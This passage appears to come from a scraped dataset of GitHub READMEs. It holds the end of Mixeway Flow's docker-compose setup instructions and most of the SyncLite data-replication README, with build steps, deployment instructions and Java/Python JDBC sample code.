      POSTGRES_DB: flow
      POSTGRES_USER: flow_user
      POSTGRES_PASSWORD: flow_pass
    volumes:
      - flowdb_data:/var/lib/postgresql/data

  flow:
    image: mixeway/flow:latest
    container_name: flow_frontend
    ports:
      - ""443:443""
    volumes:
      - flow_data:/etc/nginx/ssl
    depends_on:
      - backend

volumes:
  flowdb_data:
  flow_data:
  pki_data:
  dependency_track_data:
EOF
docker-compose up
```

either way what will happen:
1. Postgres database will be set up
2. Backend will be set up, self-signed certificates will be generated, dependency track will be started
3. Frontend application will be started via nginx

application will be started at: `https://localhost:443`

initial password is: `admin:admin` - You will be forced to change it during first login

## Initial configuration

1. after login create a team
2. import the repository
3. register webhook
![webhook](.github/img/webhook.png)

Browse Detected vulnerabilities:
![webhook](.github/img/vulns.png)


## Documentation

> Under donstruction


## Roadmap

Features to be covered in the near future:
- SSO integration (OAuth, keycloak, gitlab login)
- BugTracking automated issues (gitlab issues, JIRA)
- Merge Request commenting with scanning results

Features to be covered in the further future:
- Integration with GitHub (the same scope as GitLab)
- Enhancing SCA engin with linking code repository with docker image in registry

---
",4,0,1,0.0,"['mixeway', 'flow', 'introduction', 'how', 'mixeway', 'flow', 'work', 'vulnerability', 'threat', 'detection', 'sast', 'engine', 'bearer', 'http', 'sca', 'engine', 'sbom', 'owasp', 'dependency', 'track', 'http', 'iac', 'engine', 'kics', 'http', 'secret', 'leak', 'engine', 'giteaks', 'http', 'installation', 'option', 'option', 'initial', 'configuration', 'documentation', 'roadmap']","['engine', 'http', 'mixeway', 'flow', 'option']",1.0,[org.springframework.boot:spring-boot-maven-plugin],0.0,1.0,0.0
syncliteio/SyncLite,main,"
<p align=""center"">
  <a href=""https://www.synclite.io"">
  <img src=""docs/images/SyncLite_logo.png"" alt=""SyncLite - Build Anything Sync Anywhere"">
  </a>
  <p align=""center"">
    <a href=""https://www.synclite.io"">Learn more</a>
    ·
    <a href=""https://join.slack.com/t/syncliteworkspace/shared_invite/zt-2pz945vva-uuKapsubC9Mu~uYDRKo6Jw"">Chat on Slack</a>
  </p>
</p>

# SyncLite - Build Anything Sync Anywhere

<a href=https://www.synclite.io>SyncLite</a> is an open-source, low-code, comprehensive relational data consolidation platform enabling developers to rapidly build data intensive applications for edge, desktop and mobile environments. SyncLite enables real-time, transactional data replication and consolidation from various sources including edge/desktop applications using popular embedded databases (SQLite, DuckDB, Apache Derby, H2, HyperSQL), data streaming applications, IoT message brokers, traditional database systems(ETL) and more into a diverse array of databases, data warehouses, and data lakes, enabling AI and ML use-cases at edge and cloud.

<p align=""center"">
  <a href=""https://www.synclite.io"">
  <img src=""docs/images/SyncLite_Overview.png"" width=""80%"" height=""80%"" alt=""SyncLite - Build Anything Sync Anywhere"">
  </a>
</p>

SyncLite enables following scenarios for industry leading databases, data warehouse and data lakes.

## Build Sync-Ready Applications: 
SyncLite provides a novel CDC replication framework for embedded databases, helping developers quickly build data-intensive applications, including Gen AI Search and RAG applications, for edge, desktop, and mobile environments. It integrates seamlessly with popular embedded databases like SQLite, DuckDB, Apache Derby, H2, and HyperSQL (HSQLDB), enabling Change Data Capture (CDC), transactional, real-time data replication, and consolidation into industry-leading databases, data warehouses, and data lakes. 

```SyncLite Logger```, an embeddable Java library (JDBC driver), captures all SQL transactions in log files that can be consumed by Java and Python applications for efficient data syncing.

```SyncLite DB```, a standalone sync-enabled database, accepting SQL requests in JSON format over HTTP, making it compatible with any programming language (Java, Python, C++, C#, Go, Rust, Ruby, Node.js etc.) and ideal for flexible, real-time data integration and consolidation, right from edge/desktop applications into final data destinations.
```

{Edge/Desktop Apps} + {SyncLite Logger + Embedded Databases} ---> {Staging Storage} ---> {SyncLite Consolidator} ---> {Destination DB/DW/DataLakes}
```

```
{Edge/Desktop Apps} ---> {SyncLite DB + Embedded Databases} ---> {Staging Storage} ---> {SyncLite Consolidator} ---> {Destination DB/DW/DataLakes}
```

Learn more: 

https://www.synclite.io/synclite/sync-ready-apps

https://www.synclite.io/solutions/gen-ai-search-rag


## Build Streaming Applications For Last Mile Delivery: 
SyncLite facilitates development of large-scale data streaming applications through SyncLite Logger, which offers both a Kafka Producer API and SQL API. This allows for the ingestion of massive amounts of data and provides the capability to query the ingested data using the SQL API within applications. Together, SyncLite Logger and SyncLite Consolidator enable seamless last-mile data integration from thousands of streaming application instances into a diverse array of final data destinations.

```
{Data Streaming Apps} + {SyncLite Logger} ---> {Staging Storage} ---> {SyncLite Consolidator} ---> {Destination DB/DW/DataLakes}
```

```
{Data Streaming Apps} ---> {SyncLite DB} ---> {Staging Storage} ---> {SyncLite Consolidator} ---> {Destination DB/DW/DataLakes}
```

Learn more: https://www.synclite.io/synclite/last-mile-streaming


## Deploy Database ETL/Replication/Migration Pipelines:
Set up many-to-many, scalable database replication/migration/incremental ETL pipelines from a diverse range of source databases and raw data files into a diverse range of destinations.

```
{Source Databases} ---> {SyncLite DBReader} ---> {Staging Storage} ---> {SyncLite Consolidator} ---> {Destination DB/DW/DataLakes}
```

Learn More: https://www.synclite.io/solutions/smart-database-etl

## Setup Rapid IoT Data Connectors:
Connect numerous MQTT brokers (IoT gateways) to one or more destination databases.

```
{IoT Message Brokers} ---> {SyncLite QReader} ---> {Staging Storage} ---> {SyncLite Consolidator} ---> {Destination DB/DW/DataLakes}
```

Learn More: https://www.synclite.io/solutions/iot-data-connector

# SyncLite Components

```SyncLite Logger``` is a JDBC driver, enables developers to rapidly build 
	
-sync-enabled, robust, responsive, high-performance, low-latency, transactional, data intensive applications for edge/mobile/desktop platforms using their favorite embedded databases (SQLite, DuckDB, Apache Derby, H2, HyperSQL)
  	
-large scale data streaming solutions for last mile data integrations into a wide range of industry leading databases, while offering ability to perform real-time analytics using the native embedded databases over streaming data, at the producer end of the pipelines.

```SyncLite DB``` is a sync-enabled, single-node database server that wraps popular embedded databases like SQLite, DuckDB, Apache Derby, H2, and HyperSQL. Unlike the embeddable SyncLite Logger library for Java and Python applications, SyncLite DB acts as a standalone server, allowing your edge or desktop applications—regardless of the programming language—to connect and send SQL requests (wrapped in JSON format) over HTTP. 

```SyncLite Client``` is a command line tool to operate SyncLite devices, to execute SQL queries and workloads.

```SyncLite DBReader``` enables data teams and data engineers to configure and orchestrate many-to-many, highly scalable, incremental/log-based database ETL/replication/migration jobs across a diverse array of databases, data warehouses and data lakes.

```SyncLite QReader``` enables developers to integrate IoT data published to message queue brokers, into a diverse array of databases, data warehouses and data lakes, enabling real-time analytics and AI use cases at all three levels: edge, fog and cloud.

```SyncLite Consolidator``` is the centralized application to all the reader/producer tools mentioned above, which receives and consolidates the incoming data and log files in real-time into one or more databases, data warehouses and data lakes of user’s choice. SyncLite Consolidator also offers additional features: table/column/value filtering and mapping, data type mapping, database trigger installation, fine-tunable writes, support for multiple destinations and more.

```SyncLite JobMonitor``` enables managing, scheduling and monitoring all SyncLite jobs created on a given host.

```SyncLite Validator``` is an E2E integration testing tool for SyncLite.

# Build SyncLite

1. If you are using a pre-built release then ignore this section. 
2. Install/Download Apache Maven(3.8.6 or above): https://maven.apache.org/download.cgi
3. If you opt to not use the deploy scripts generated in the release which download the prerequisite software : Apache Tomcat and OpenJDK, then manually install them
	
 	a. OpenJDK 11 : https://jdk.java.net/java-se-ri/11
	
 	b. Apache Tomcat 9.0.95 : https://tomcat.apache.org/download-90.cgi

5. Run following: 
	```
	git clone --recurse-submodules git@github.com:syncliteio/SyncLite.git SyncLite
	
	cd SyncLite
	
	mvn -Drevision=oss clean install
	
	```
6. Release is created under SyncLite/target

## Release Structure:

The build process creates following release structure under SyncLite\target: 
```
synclite-platform-<version>
|
|
--------lib
|       |
|       |
|        --------logger
|       |        |
|       |        |
|       |        --------java
|       |        |        |
|       |        |        |    
|       |        |        --------synclite-logger-<version>.jar   ==> SyncLite Logger JDBC driver, to be added as a depependency in your edge apps
|       |        |
|       |        |
|       |        --------synclite_logger.conf  ==> A sample configuration file for SyncLite logger.
|       |
|       |
|       --------consolidator
|       |        |
|       |        |
|       |        --------synclite-consolidator-<version>.war   ==> SyncLite Consolidator application, to be deployed on an application server such as Tomcat on a centralized host
|
|
|
|
--------sample-apps
|        |
|        |
|        --------jsp-servlet
|        |        |
|        |        |
|        |        --------web
|        |        |
|        |        |
|        |        --------src          ==> Source code of a sample Jsp Servlet app that demonstrates usage of synclite-logger
|        |        |
|        |        |
|        |        --------target        
|        |        |
|        |        |
|        |        --------synclite-sample-app-<version>.war
|        |        
|        |
|        --------java
|        |        |
|        |        |
|        |        --------*.java    => Java source files demonstrating SyncLite logger usage.
|        |        |
|        |        |
|        |        --------README
|        |
|        |
|        |
|        |
|        --------python
|                |
|                |
|                --------*.py    => Python source files demonstrating SyncLite logger usage.
|                |
|                |
|                --------README
|
|
|
|
--------bin
|        |
|        |
|        --------deploy.bat/deploy.sh    ==> Deployment script for deploying SyncLite consolidator and sample application from the lib directory
|        |                    
|        |                        
|        --------start.bat/start.sh    ==> Launch script to start tomcat and the deployed SyncLite applications.
|        |             
|        |           
|        --------docker-deploy.sh/docker-start.sh   ==> Deployment and launch scripts for running SyncLite Consolidator inside a docker container. 
|        |             
|        |           
|        --------stage
|        |        |         
|        |        |         
|        |        --------sftp    ==> Contains docker-deploy.sh,docker-start.sh, docker-stop.sh scripts to launch SFTP server as SyncLite stage
|        |        |         
|        |        |                                   
|        |        --------minio   ==> Contains docker-deploy.sh, docker-start.sh, docker-stop.sh scripts to launch MinIO server as SyncLite stage
|        |       
|        |       
|        |       
|        --------dst
|                |
|                |                
|                --------postgresql  ==> Contains docker-deploy.sh,docker-start.sh scripts to launch PostgrSQL server as SyncLite destination DB
|                |         
|                |                                  
|                --------mysql   ==> Contains docker-deploy.sh, docker-start.shscripts to launch MySQL server as SyncLite destination DB
| 
|
|
--------tools
        |
        |
        --------synclite-client   ==> Client tool to execute SQL operations on SyncLite databases/devices.
	|
	|
        --------synclite-db    ==> A standalone database server offering sync-enabled embedded databases for edge/desktop applications. 
	|
	|
        --------synclite-dbreader    ==> Smart database ETL/Replication/Migration tool
	|
	|
	--------synclite-qreader     ==> Rapid IoT data connector tool
	|
	|
	--------synclite-job-monitor   ==> Job Monitor tool to manage, monitor and schedule SyncLite jobs.
	|
	|
        --------synclite-validator    ==> An E2E integration testing tool for SyncLite
 

```

### Quick Start - Native/Docker based

NOTE: Below instructions enable a quick start and trial of SyncLite platform. 
For production usage, it is recommended to go through installation process to install OpenJDK11 and Tomcat9 (as a service) 
on your Windows/Ubuntu host.

1. Enter bin directory.

2. (One time) Run ```deploy.bat```(WINDOWS) / ```deploy.sh``` (UBUNTU) to deploy the SyncLite consolidator and a SyncLite sample application.
   
   OR Run ```docker-deploy.sh``` (UBUNTU) to deploy a docker container for SyncLite platform.

   OR Manually deploy below war files on your tomcat server:
   - ```SyncLite\target\synclite-platform-dev\lib\consolidator\synclite-consolidator-oss.war```,
   - ```SyncLite\target\synclite-platform-dev\sample-apps\jsp-servlet\web\target\synclite-sample-app-oss.war```
   - ```SyncLite\target\synclite-platform-dev\tools\synclite-dbreader\synclite-dbreader-oss.war```
   - ```SyncLite\target\synclite-platform-dev\tools\synclite-dbreader\synclite-qreader-oss.war```
   - ```SyncLite\target\synclite-platform-dev\tools\synclite-dbreader\synclite-jobmonitor-oss.war```
     
   
3. Run ```start.bat```(WINDOWS) / ```start.sh```(UBUNTU) to start tomcat and the deployed SyncLite applications. (Please note the username/password for tomcat manager web console is synclite/synclite)

   OR Run ```docker-start.sh``` to run the docker container (Please check options passed to docker run command e.g. the home directory of the current user is mapped to ```/root``` inside docker to persist all the
   SyncLite storage in the native host).

   OR manually start applications from your tomcat manager console.

4. Open tomcat manager console http://localhost:8080/manager (Use synclite/synclite as the default user/password when prompted as set by the deploy script). The manager web console will show all the SyncLite applications deployed. 

5. Open http://localhost:8080/synclite-consolidator to launch SyncLite Consolidator application

6. Open http://localhost:8080/synclite-sample-app to launch SyncLite sample web application 

7. Configure and start SyncLite consolidator job in the SyncLite Consolidator application. You can follow through the ""Configure Job"" wizard reviewing all the default configuration values. Create databases/devices of any type from the deployed sample web application and execute SQL workloads on several devices at once specifying the device index range. Observe data consolidator in the SyncLite Cosolidator dashboard. You can check device specific data consolidation progress on individual device pages (from ""List Devices"" page), query destination database on the ""Analyze Data"" page. 

8. This release also comes with a CLI client for SyncLite under tools/synclite-client. You can run synclite-client.bat(WINDOWS)/synclite-client.sh (UBUNTU) to start the client tool and execute SQL operations which are not only executed/persisted on the native database but also consolidated by the SyncLite consolidator into destination DB.
   - Usage 1 : ```synclite-client.bat/synclite-client.sh ==> Will start with DB = <USER.HOME>/synclite/job1/db/test.db, DEVICE_TYPE = SQLITE, CONFIG = <USER.HOME>/synclite/db/synclite_logger.conf```
   - Usage 2 : ```synclite-client.bat/synclite-client.sh <path/to/db/file> --device-type <SQLITE|DUCKDB|DERBY|H2|HYPERSQL|STREAMING|SQLITE_APPENDER|DUCKDB_APPENDER|DERBY_APPENDER|H2_APPENDER|HYPERSQL_APPENDER> --synclite-logger-config <path/to/synclite/logger/config> --server <SyncLite DB Address>```
   - Note: If --sever switch is specified then the client connects to SyncLite DB to  execute SQL statements, else it usages embedded ```SyncLite Logger``` library to directly operate on the devices.
     
9. This release also comes with SyncLite DB server under tools/synclite-db. You can run synclite-db.bat(WINDOWS)/synclite-db.sh(UBUNTU) to start SyncLite DB server and connect to it using synclite-client to execute SQL operations which are not only executed/persisted on the specified embedded database but also consolidated by the SyncLite Consolidator onto the destination databases.
   - Usage 1 : ```synclite-db.bat/synclite-db.sh``` ==> Will start SyncLite DB with default configurations
   - Usage 2 : ```synclite-db.bat/synclite-db.sh --config <path/to/synclite-db/config>```
          
10. Use ```stop.bat``` (Windows) / ```stop.sh```(LINUX) to stop SyncLite consolidator job (if running) and tomcat.
   OR RUN docker-stop.sh to stop the docker container.

11. Refer ```sample_apps/java``` and ```samples_apps/python``` and use any of them as a starting point to build your own application.

12. You can install/use a database of your choice and  perform data consolidation to it (instead of the default SQLite destination): PostgreSQL, MySQL, MongoDB, SQLite, DuckDB.

13. This release also packages docker scripts to setup PostgreSQL and MySQL to serve as SyncLite destinations.
    - ```bin/dst/postgresql``` contains ```docker-deploy.sh```, ```docker-start.sh``` and ```docker-stop.sh```
    - ```bin/dst/mysql``` contains ```docker-deploy.sh```, ```docker-start.sh``` and ```docker.stop.sh```

14. You can deploy your applications on remote hosts/devices and share the local-stage-directory of your respective SyncLite applications with SyncLite Consolidator host via one of the following file staging storages: 
    - SFTP
    - Amazon S3
    - MinIO Object Storage Server
    - Apache Kafka
    - Microsoft OneDrive
    - Google Drive
    - NFS Sharing
    - Local Network Sharing
      
Please check documentation for setting up these staging storages for SyncLite : https://www.synclite.io/resources/documentation
 
15. This release also packages docker scripts to setup SFTP and MinIO servers to serve as SyncLite stage.
    - ```bin/stage/sftp```  contains ```docker-deploy.sh```, ```docker-start.sh``` and ```docker-stop.sh```
    - ```bin/stage/minio``` contains ```docker-deploy.sh```, ```docker-start.sh``` and ```docker-stop.sh```
      NOTE: These scripts contain default configurations. You must change usernames, passwords and setup any additional security mechanisms on top of these basic setups. 

16. The SyncLite docker scripts ```bin/docker-deploy.sh```, ```bin/docker-start.sh```, ```bin/docker-stop.sh``` contain two variables at the top to choose a stage and destination:
    - STAGE : Set it to SFTP or MINIO.
    - DST : Set it to POSTGRESQL or MYSQL.

      Once you set the STAGE and DST to appropriate values e.g. SFTP and POSTGRESQL, the ```docker-deploy.sh``` and ```docker-start.sh``` scripts will bring up docker containers for SyncLite consolidator, SFTP
      server and PostgreSQL server and you will be all set to configure and start a SyncLite consoldiator job be able to consolidate data into PostgreSQL server received from remote SyncLite applications
      configured to connect to the SFTP stage. 

17. After a successful trial, if you need to perform another trial, stop the docker containers, and delete contents under ```/home/synclite``` to start a fresh trial of a different scenario etc.

18. Open http://localhost:8080/synclite-dbreader (and open http://localhost:8080/synclite-consolidator) to setup database ETL/Replication/Migration pipelines.

19. Open http://localhost:8080/synclite-qreader (and open http://localhost:8080/synclite-consolidator) to setup rapid IoT pipelines.

20. Open http://localhost:8080/synclite-job-monitor to manage, monitor and schedule various SyncLite jobs.
    
Refer documentation at https://www.synclite.io/resources/documentation for more details.

NOTE : For production usage, it is recommended to install OpenJDK11 and Tomcat as a service (or any other application server of your choice) and deploy SyncLite consolidator web archive release, Please refer our documentation at www.synclite.io for detailed installation steps for Windows and Ubuntu.


# Using SyncLite Logger

Add ```synclite-logger-<version>.jar``` file created as part of the above build as a dependency in your application.

## Configuration File

Refer ```src/main/resources/synclite_logger.conf``` file for all available configuration options for SyncLite Logger. Refer ""SyncLite Logger Configuration"" section in the documentation at https://www.synclite.io/resources/documentation for more details about all configuration options. 

## Application Code Samples (SQL API)

Refer below code samples to build applications using SyncLite Logger. 

### Transactional Devices : 

Transactional devices (SQLite, DuckDB, Apache Derby, H2, HyperSQL) support all database operations and perform transactional logging of all the DDL and DML operations performed by the application. These enable  developers to build use cases such as building data-intensive sync-ready applications for edge, edge + cloud GenAI search and RAG applications, native SQL (hot) hot data stores, SQL application caches, edge enablement of cloud databases and more.

#### Java
```
package testApp;

import java.nio.file.Path;
import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.PreparedStatement;
import java.sql.SQLException;
import java.sql.Statement;
import io.synclite.logger.*;


public class TestTransactionalDevice {
	
	public static Path syncLiteDBPath;
	public static void appStartup() throws SQLException, ClassNotFoundException {
		syncLiteDBPath = Path.of(System.getProperty(""user.home""), ""synclite"", ""db"");
		Class.forName(""io.synclite.logger.SQLite"");
		//
		//////////////////////////////////////////////////////
		//For other types of transactional devices : 
		//DuckDB : Class.forName(""io.synclite.logger.DuckDB"");
		//Apache Derby : Class.forName(""io.synclite.logger.Derby"");
		//H2 : Class.forName(""io.synclite.logger.H2"");
		//HyperSQL : Class.forName(""io.synclite.logger.HyperSQL"");
		//////////////////////////////////////////////////////
		//

		Path dbPath = syncLiteDBPath.resolve(""test_tran.db"");
		SQLite.initialize(dbPath, syncLiteDBPath.resolve(""synclite_logger.conf""));
		//
		//////////////////////////////////////////////////////
		//For other types of transactional devices : 
		//DuckDB : DuckDB.initialize(dbPath, syncLiteDBPath.resolve(""synclite_logger.conf""));
		//Apache Derby : Derby.initialize(dbPath, syncLiteDBPath.resolve(""synclite_logger.conf""));
		//H2 : H2.initialize(dbPath, syncLiteDBPath.resolve(""synclite_logger.conf""));
		//HyperSQL : HyperSQL.initialize(dbPath, syncLiteDBPath.resolve(""synclite_logger.conf""));
		//////////////////////////////////////////////////////
		//
	}	
	
	public void myAppBusinessLogic() throws SQLException {
		//
		//Some application business logic
		//
		//Perform some database operations		
		try (Connection conn = DriverManager.getConnection(""jdbc:synclite_sqlite:"" + syncLiteDBPath.resolve(""test_sqlite.db""))) {
			//
		        //////////////////////////////////////////////////////////////////
			//For other types of transactional devices use following connection strings :
			//For DuckDB : jdbc:synclite_duckdb:<db_path>
			//For Apache Derby : jdbc:synclite_derby:<db_path>
			//For H2 : jdbc:synclite_h2:<db_path>
			//For HyperSQL : jdbc:synclite_hsqldb:<db_path>
			///////////////////////////////////////////////////////////////////
			//
			try (Statement stmt = conn.createStatement()) { 
				//Example of executing a DDL : CREATE TABLE. 
				//You can execute other DDL operations : DROP TABLE, ALTER TABLE, RENAME TABLE.
				stmt.execute(""CREATE TABLE IF NOT EXISTS feedback(rating INT, comment TEXT)"");
				
				//Example of performing INSERT
				stmt.execute(""INSERT INTO feedback VALUES(3, 'Good product')"");				
			}
			
			//Example of setting Auto commit OFF to implement transactional semantics
			conn.setAutoCommit(false);
			try (Statement stmt = conn.createStatement()) { 
				//Example of performing basic DML operations INSERT/UPDATE/DELETE
				stmt.execute(""UPDATE feedback SET comment = 'Better product' WHERE rating = 3"");
				stmt.execute(""INSERT INTO feedback VALUES (1, 'Poor product')"");
				stmt.execute(""DELETE FROM feedback WHERE rating = 1"");
			}
			conn.commit();
			conn.setAutoCommit(true);
			
			//Example of Prepared Statement functionality for bulk insert.			
			try(PreparedStatement pstmt = conn.prepareStatement(""INSERT INTO feedback VALUES(?, ?)"")) {
				pstmt.setInt(1, 4);
				pstmt.setString(2, ""Excellent Product"");
				pstmt.addBatch();
				
				pstmt.setInt(1, 5);
				pstmt.setString(2, ""Outstanding Product"");
				pstmt.addBatch();
				
				pstmt.executeBatch();			
			}
		}
		//Close SyncLite database/device cleanly.
		SQLite.closeDevice(Path.of(""test_sqlite.db""));
		//
		///////////////////////////////////////////////////////
		//For other types of transactional devices :
		//DuckDB : DuckDB.closeDevice
		//Apache Derby : Derby.closeDevice
		//H2 : H2.closeDevice
		//HyperSQL : HyperSQL.closeDevice
		//////////////////////////////////////////////////////
		//
		//You can also close all open databases in a single SQL : CLOSE ALL DATABASES
	}	
	
	public static void main(String[] args) throws ClassNotFoundException, SQLException {
		appStartup();
		TestTransactionalDevice testApp = new TestTransactionalDevice();
		testApp.myAppBusinessLogic();
	}
}

```
#### Python   

```
import jaydebeapi

props = {
  ""config"": ""synclite_logger.conf"",
  ""device-name"" : ""tran1""
}
conn = jaydebeapi.connect(""io.synclite.logger.SQLite"",
                           ""jdbc:synclite_duckdb:c:\\synclite\\python\\data\\test_sqlite.db"",
                           props,
                           ""synclite-logger-<version>.jar"",)
#//
#////////////////////////////////////////////////////////////////
#For other types of transactional devices use following are the class names and connection strings :
#For DuckDB - Class : io.synclite.logger.DuckDB, Connection String : jdbc:synclite_duckdb:<db_path>
#For Apache Derby - Class : io.synclite.logger.Derby, Connection String : jdbc:synclite_derby:<db_path>
#For H2 - Class : io.synclite.logger.H2, Connection String : jdbc:synclite_h2:<db_path>
#For HyperSQL - Class : io.synclite.logger.HyperSQL, Connection String : jdbc:synclite_hsqldb:<db_path>
#/////////////////////////////////////////////////////////////////
#//

curs = conn.cursor()

#Example of executing a DDL : CEATE TABLE.
#You can execute other DDL operations : DROP TABLE, ALTER TABLE, RENAME TABLE.
curs.execute('CREATE TABLE IF NOT EXISTS feedback(rating INT, comment TEXT)')

#Example of performing basic DML operations INSERT/UPDATE/DELETE
curs.execute(""insert into feedback values (3, 'Good product')"")

#Example of setting Auto commit OFF to implement transactional semantics
conn.jconn.setAutoCommit(False)
curs.execute(""update feedback set comment = 'Better product' where rating = 3"")
curs.execute(""insert into feedback values (1, 'Poor product')"")
curs.execute(""delete from feedback where rating = 1"")
conn.commit()
conn.jconn.setAutoCommit(True)


#Example of Prepared Statement functionality for bulk insert.
args = [[4, 'Excellent product'],[5, 'Outstanding product']]
curs.executemany(""insert into feedback values (?, ?)"", args)

#Close SyncLite database/device cleanly.
curs.execute(""close database c:\\synclite\\python\\data\\test_sqlite.db"");

#You can also close all open databases in a single SQL : CLOSE ALL DATABASES
```

### Appender Devices :

Appender devices (SQLiteAppender, DuckDBAppender, DerbyAppender, H2Appender, HyperSQLAppender) support all DDL operations and Prepared Statement based INSERT operations, are highly optimized for high speed concurrent batched data ingestion, performing logging of ingested data. Unlike transactional devices, appender devices only allow INSERT DML operations (UPDATE and DELETE are not allowed). Appender devices enable developers to build high volume streaming applications enabled with last mile data integration from thousands of edge points into centralized database destinations as well as in-app analytics by enabling fast read access to ingested data from the underlying local embedded databases storing the ingested/streamed data.

#### Java

```
package testApp;

import java.nio.file.Path;
import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.PreparedStatement;
import java.sql.SQLException;
import java.sql.Statement;
import io.synclite.logger.*;

public class TestAppenderDevice {
	public static Path syncLiteDBPath;

	public static void appStartup() throws SQLException, ClassNotFoundException {
		syncLiteDBPath = Path.of(System.getProperty(""user.home""), ""synclite"", ""db"");
		Class.forName(""io.synclite.logger.SQLiteAppender"");
		//
		//////////////////////////////////////////////////////
		//For other types of appender devices : 
		//DuckDB : Class.forName(""io.synclite.logger.DuckDBAppender"");
		//Apache Derby : Class.forName(""io.synclite.logger.DerbyAppender"");
		//H2 : Class.forName(""io.synclite.logger.H2Appender"");
		//HyperSQL : Class.forName(""io.synclite.logger.HyperSQLAppender"");
		//////////////////////////////////////////////////////
		//
		Path dbPath = syncLiteDBPath.resolve(""test_appender.db"");
		SQLiteAppender.initialize(dbPath, syncLiteDBPath.resolve(""synclite_logger.conf""));
	}

	public void myAppBusinessLogic() throws SQLException {
		//
		// Some application business logic
		//
		// Perform some database operations
		try (Connection conn = DriverManager.getConnection(""jdbc:synclite_sqlite_appender:"" + syncLiteDBPath.resolve(""test_appender.db""))) {
			//
		        //////////////////////////////////////////////////////////////////
			//For other types of appender devices use following connection strings :
			//For DuckDBAppender : jdbc:synclite_duckdb_appender:<db_path>
			//For DerbyAppender : jdbc:synclite_derby_appender:<db_path>
			//For H2Appender : jdbc:synclite_h2_appender:<db_path>
			//For HyperSQLAppender : jdbc:synclite_hsqldb_appender:<db_path>
			///////////////////////////////////////////////////////////////////
			//
			try (Statement stmt = conn.createStatement()) {
				// Example of executing a DDL : CREATE TABLE.
				// You can execute other DDL operations : DROP TABLE, ALTER TABLE, RENAME TABLE.
				stmt.execute(""CREATE TABLE IF NOT EXISTS feedback(rating INT, comment TEXT)"");
			}

			//
			// Example of Prepared Statement functionality for bulk insert.
			// Note that Appender Devices allows all DDL operations, INSERT INTO DML operations (UPDATES and DELETES are not allowed) and SELECT queries.
			//
			try (PreparedStatement pstmt = conn.prepareStatement(""INSERT INTO feedback VALUES(?, ?)"")) {
				pstmt.setInt(1, 4);
				pstmt.setString(2, ""Excellent Product"");
				pstmt.addBatch();

				pstmt.setInt(1, 5);
				pstmt.setString(2, ""Outstanding Product"");
				pstmt.addBatch();

				pstmt.executeBatch();
			}
		}
		// Close SyncLite database/device cleanly.
		SQLiteAppender.closeDevice(Path.of(""test_appender.db""));
		//
		///////////////////////////////////////////////////////
		//For other types of appender devices :
		//DuckDBAppender : DuckDBAppender.closeDevice
		//DerbyAppender : DerbyAppender.closeDevice
		//H2Appender : H2Appender.closeDevice
		//HyperSQLAppender : HyperSQLAppender.closeDevice
		//////////////////////////////////////////////////////
		//
		// You can also close all open databases/devices in a single SQL : CLOSE ALL
		// DATABASES
	}

	public static void main(String[] args) throws ClassNotFoundException, SQLException {
		appStartup();
		TestAppenderDevice testApp = new TestAppenderDevice();
		testApp.myAppBusinessLogic();
	}

}
```

#### Python

```
import jaydebeapi
props = {
  ""config"": ""synclite_logger.conf"",
  ""device-name"" : ""appender1""
}
conn = jaydebeapi.connect(""io.synclite.logger.SQLiteAppender"",
                           ""jdbc:synclite_sqlite_appender:c:\\synclite\\python\\data\\test_appender.db"",
                           props,
                           ""synclite-logger-<version>.jar"",)
#//
#////////////////////////////////////////////////////////////////
#For other types of appender devices use following are the class names and connection strings :
#For DuckDBAppender - Class : io.synclite.logger.DuckDBAppender, Connection String : jdbc:synclite_duckdb_appender:<db_path>
#For DerbyAppender - Class : io.synclite.logger.DerbyAppender, Connection String : jdbc:synclite_derby_appender:<db_path>
#For H2Appender - Class : io.synclite.logger.H2Appender, Connection String : jdbc:synclite_h2_appender:<db_path>
#For HyperSQLAppender - Class : io.synclite.logger.HyperSQLAppender, Connection String : jdbc:synclite_hsqldb_appender:<db_path>
#/////////////////////////////////////////////////////////////////
#//

curs = conn.cursor()

#Example of executing a DDL : CREATE TABLE.
#You can execute other DDL operations : DROP TABLE, ALTER TABLE, RENAME TABLE.
curs.execute('CREATE TABLE IF NOT EXISTS feedback(rating INT, comment TEXT)')

#Example of Prepared Statement functionality for bulk insert.
args = [[4, 'Excellent product'],[5, 'Outstanding product']]
curs.executemany(""insert into feedback values (?, ?)"", args)

#Close SyncLite database/device cleanly.
curs.execute(""close database c:\\synclite\\python\\data\\test_appender.db"");

#You can also close all open databases in a single SQL : CLOSE ALL DATABASES
```

### Streaming Device : 
Streaming device allows all DDL operations (as supported by SQLite) and Prepared Statement based INSERT operations (UPDATE and DELETE are not allowed) to allow high speed concurrent batched data ingestion, performing logging and streaming of the ingested data. Streaming device enable developers to build high volume data streaming applications enabled with last mile data integration from thousands of edge applications into one or more centralized databases/data warehouses/data lakes.

#### Java

```
package testApp;

import java.nio.file.Path;
import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.PreparedStatement;
import java.sql.SQLException;
import java.sql.Statement;
import io.synclite.logger.*;

public class TestStreamingDevice {
	public static Path syncLiteDBPath;

	public static void appStartup() throws SQLException, ClassNotFoundException {
		syncLiteDBPath = Path.of(System.getProperty(""user.home""), ""synclite"", ""db"");
		Class.forName(""io.synclite.logger.Streaming"");
		Path dbPath = syncLiteDBPath.resolve(""t_str.db"");
		Streaming.initialize(dbPath, syncLiteDBPath.resolve(""synclite_logger.conf""));
	}

	public void myAppBusinessLogic() throws SQLException {
		//
		// Some application business logic
		//
		// Perform some database operations
		try (Connection conn = DriverManager
				.getConnection(""jdbc:synclite_streaming:"" + syncLiteDBPath.resolve(""t_str.db""))) {
			try (Statement stmt = conn.createStatement()) {
				// Example of executing a DDL : CREATE TABLE.
				// You can execute other DDL operations : DROP TABLE, ALTER TABLE, RENAME TABLE.
				stmt.execute(""CREATE TABLE IF NOT EXISTS feedback(rating INT, comment TEXT)"");
			}

			// Example of Prepared Statement functionality for bulk insert.
			try (PreparedStatement pstmt = conn.prepareStatement(""INSERT INTO feedback VALUES(?, ?)"")) {
				pstmt.setInt(1, 4);
				pstmt.setString(2, ""Excellent Product"");
				pstmt.addBatch();

				pstmt.setInt(1, 5);
				pstmt.setString(2, ""Outstanding Product"");
				pstmt.addBatch();

				pstmt.executeBatch();
			}
		}
		// Close SyncLite database/device cleanly.
		Streaming.closeDevice(Path.of(""t_str.db""));
		// You can also close all open databases/devices in a single SQL : CLOSE ALL
		// DATABASES
	}

	public static void main(String[] args) throws ClassNotFoundException, SQLException {
		appStartup();
		TestStreamingDevice testApp = new TestStreamingDevice();
		testApp.myAppBusinessLogic();
	}
}
```
#### Python

